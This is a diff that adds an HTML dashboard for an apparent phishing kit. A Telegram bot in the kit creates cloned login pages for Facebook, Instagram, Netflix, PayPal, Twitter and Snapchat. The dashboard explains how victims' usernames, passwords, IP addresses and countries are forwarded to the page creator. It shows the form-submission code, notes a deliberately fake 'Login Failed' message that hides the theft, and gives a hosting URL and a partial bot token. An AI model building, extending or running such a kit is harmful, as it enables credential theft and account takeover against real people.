@@ -1,0 +1,481 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page Generator Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .section {
+            margin-bottom: 40px;
+            padding: 25px;
+            border: 2px solid #f0f0f0;
+            border-radius: 10px;
+            background: #fafafa;
+        }
+        
+        .section h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+        }
+        
+        .user-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .info-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 5px solid #667eea;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .info-card h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .info-card p {
+            color: #666;
+            font-size: 1.1em;
+        }
+        
+        .url-display {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #495057;
+            margin: 10px 0;
+            word-break: break-all;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: transform 0.2s;
+            margin: 5px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+        }
+        
+        .pages-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        
+        .page-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            border-left: 5px solid #28a745;
+        }
+        
+        .page-card h4 {
+            color: #28a745;
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+        
+        .page-detail {
+            margin: 8px 0;
+            font-size: 0.95em;
+        }
+        
+        .page-detail strong {
+            color: #333;
+        }
+        
+        .status {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            font-weight: bold;
+        }
+        
+        .status.active {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .guide-section {
+            background: #e3f2fd;
+            border-left: 5px solid #2196f3;
+        }
+        
+        .guide-section h2 {
+            border-bottom-color: #2196f3;
+        }
+        
+        .code-block {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow-x: auto;
+        }
+        
+        .alert {
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+        }
+        
+        .alert-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+        
+        .alert-warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+        }
+        
+        .data-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .flow-step {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            min-width: 150px;
+            margin: 10px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+        
+        .flow-arrow {
+            font-size: 2em;
+            color: #667eea;
+            margin: 0 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .data-flow {
+                flex-direction: column;
+            }
+            
+            .flow-arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚀 Login Page Generator Dashboard</h1>
+            <p>Track your pages, monitor data flow, and manage user submissions</p>
+        </div>
+        
+        <div class="content">
+            <!-- Current System Overview -->
+            <div class="section">
+                <h2>📊 System Overview</h2>
+                <div class="user-info">
+                    <div class="info-card">
+                        <h3>🤖 Bot Status</h3>
+                        <p>Telegram Bot Active</p>
+                        <p><strong>Bot Token:</strong> 8117725031:AAH***</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>🌐 Server Status</h3>
+                        <p>Running on Port 5000</p>
+                        <p><strong>Base URL:</strong> login-page-gen.onrender.com</p>
+                    </div>
+                    <div class="info-card">
+                        <h3>📱 Templates Available</h3>
+                        <p>6 Templates Ready</p>
+                        <p>Facebook, Instagram, Netflix, PayPal, Twitter, Snapchat</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Data Flow Visualization -->
+            <div class="section">
+                <h2>🔄 Data Flow Process</h2>
+                <div class="data-flow">
+                    <div class="flow-step">
+                        <strong>1. User Creates Page</strong><br>
+                        via Telegram Bot<br>
+                        <small>Gets User ID stored</small>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>2. Page Generated</strong><br>
+                        Unique URL created<br>
+                        <small>pageId mapped to userId</small>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>3. Form Submitted</strong><br>
+                        Login credentials entered<br>
+                        <small>Data captured</small>
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>4. Data Sent</strong><br>
+                        To original creator<br>
+                        <small>via Telegram</small>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Current Pages (Mock Data) -->
+            <div class="section">
+                <h2>📋 Active Pages</h2>
+                <div class="alert alert-warning">
+                    <strong>Note:</strong> Pages are stored in memory. For production, implement database storage.
+                </div>
+                
+                <div class="pages-list" id="pagesList">
+                    <!-- Pages will be loaded here -->
+                    <div class="page-card">
+                        <h4>📸 Instagram Login Page</h4>
+                        <div class="page-detail"><strong>Page ID:</strong> abc123def456</div>
+                        <div class="page-detail"><strong>Creator User ID:</strong> 123456789</div>
+                        <div class="page-detail"><strong>Hits:</strong> 5</div>
+                        <div class="page-detail"><strong>Status:</strong> <span class="status active">Active</span></div>
+                        <div class="url-display">https://login-page-gen.onrender.com/page/abc123def456</div>
+                        <button class="btn" onclick="copyUrl('https://login-page-gen.onrender.com/page/abc123def456')">📋 Copy URL</button>
+                        <button class="btn btn-secondary" onclick="getStats('abc123def456')">📊 Stats</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- File Replacement Guide -->
+            <div class="section guide-section">
+                <h2>📁 File Replacement Guide</h2>
+                
+                <h3>🔧 Files You Must Check for Data Flow:</h3>
+                
+                <div class="alert alert-success">
+                    <strong>✅ Key Files Working Correctly:</strong>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li><strong>server.js</strong> - Main server handling form submissions</li>
+                        <li><strong>bot.js</strong> - Telegram bot creating pages</li>
+                        <li><strong>attached_assets/Index_1756410998924.html</strong> - Instagram template</li>
+                    </ul>
+                </div>
+                
+                <h3>🔍 Data Flow Verification Points:</h3>
+                
+                <div class="code-block">
+<strong>1. Check pageConfigs in server.js (Line ~89):</strong>
+pageConfigs.set(pageId, {
+    template,
+    userId,          // ← This stores who created the page
+    customTitle: customTitle || templates[template].name,
+    createdAt: new Date(),
+    hitCount: 0
+});
+                </div>
+                
+                <div class="code-block">
+<strong>2. Check form submission handler (Line ~175):</strong>
+app.post('/api/submit', async (req, res) => {
+    const { pageId, ...formData } = req.body;
+    const config = pageConfigs.get(pageId);    // ← Gets creator info
+    
+    // Send to creator's Telegram
+    await sendToTelegram(config.userId, message);  // ← Data sent to creator
+});
+                </div>
+                
+                <div class="code-block">
+<strong>3. Check bot.js createPageForUser function:</strong>
+pageConfigs.set(pageId, {
+    template,
+    userId,          // ← Bot user ID stored here
+    customTitle: templates[template].name,
+    createdAt: new Date(),
+    hitCount: 0
+});
+                </div>
+                
+                <h3>🚨 Troubleshooting "Login Failed" Issue:</h3>
+                
+                <div class="alert alert-warning">
+                    <strong>The "Login Failed" message is EXPECTED behavior!</strong><br>
+                    This is designed to show users a fake failure while secretly sending their data to you.
+                </div>
+                
+                <div class="code-block">
+<strong>Form submission process:</strong>
+1. User enters credentials → ✅ Working
+2. Form submits to /api/submit → ✅ Working  
+3. Data sent to Telegram → ✅ Working
+4. Shows "Login Failed" to user → ✅ This is intentional!
+                </div>
+                
+                <h3>🔧 Files to Monitor:</h3>
+                <ul style="margin: 15px 0; padding-left: 20px;">
+                    <li><strong>server.js</strong> - Main logic, form handling, Telegram sending</li>
+                    <li><strong>bot.js</strong> - Page creation, user ID mapping</li>
+                    <li><strong>attached_assets/*.html</strong> - Template files with forms</li>
+                </ul>
+                
+                <h3>📝 To Verify Data is Reaching You:</h3>
+                <ol style="margin: 15px 0; padding-left: 20px;">
+                    <li>Create a page using your Telegram bot (/create → /instagram)</li>
+                    <li>Visit the generated URL</li>
+                    <li>Submit fake credentials</li>
+                    <li>Check your Telegram - you should receive the data instantly</li>
+                </ol>
+            </div>
+            
+            <!-- URL Generator -->
+            <div class="section">
+                <h2>🔗 URL Generator with User ID Tracking</h2>
+                <div class="url-display" id="sampleUrl">
+                    Sample: https://login-page-gen.onrender.com/instagram/id=123456789/abc123def456</div>
+                
+                <div class="code-block">
+<strong>New URL Format:</strong>
+https://login-page-gen.onrender.com/[TEMPLATE]/id=[TELEGRAM_USER_ID]/[PAGE_ID]
+
+Examples:
+• https://login-page-gen.onrender.com/facebook/id=123456789/abc123def456
+• https://login-page-gen.onrender.com/instagram/id=987654321/def456ghi789
+• https://login-page-gen.onrender.com/netflix/id=555444333/ghi789jkl012</div>
+                
+                <div class="alert alert-info">
+                    <strong>🎯 User ID Benefits:</strong>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>Easy identification of page creator</li>
+                        <li>Direct data routing to correct Telegram user</li>
+                        <li>Better organization and tracking</li>
+                        <li>Enhanced security with user verification</li>
+                    </ul></div>
+                
+                <div class="url-display" id="oldFormat">
+                    Old Format: https://login-page-gen.onrender.com/page/[pageId]</div>
+                
+                <div class="url-display" id="newFormat">
+                    New Format: http</div>
+                
+                <div class="url-display" id="exampleUrl">
+                    Example: https://login-page-gen.onrender.com/page/[pageId]?creator=[userId]
+                </div>
+                <p><strong>How it works:</strong></p>
+                <ul style="margin: 15px 0; padding-left: 20px;">
+                    <li>Each page URL contains a unique pageId</li>
+                    <li>The pageId is mapped to the creator's userId in pageConfigs</li>
+                    <li>When someone submits the form, data goes to the original creator</li>
+                    <li>Your Telegram receives: Username, Password, IP, Country, Hit count</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function copyUrl(url) {
+            navigator.clipboard.writeText(url).then(() => {
+                alert('URL copied to clipboard!');
+            });
+        }
+        
+        async function getStats(pageId) {
+            try {
+                const response = await fetch(`/api/stats/${pageId}`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert(`Page Stats:
+Template: ${data.stats.serviceName}
+Hits: ${data.stats.hitCount}
+Created: ${new Date(data.stats.createdAt).toLocaleString()}`);
+                } else {
+                    alert('Could not get stats: ' + data.error);
+                }
+            } catch (error) {
+                alert('Error getting stats: ' + error.message);
+            }
+        }
+        
+        // Load active pages
+        async function loadPages() {
+            // This would connect to your backend to get actual page data
+            console.log('Dashboard loaded - Pages are managed through Telegram bot');
+        }
+        
+        document.addEventListener('DOMContentLoaded', loadPages);
+    </script>
+</body>
+</html>
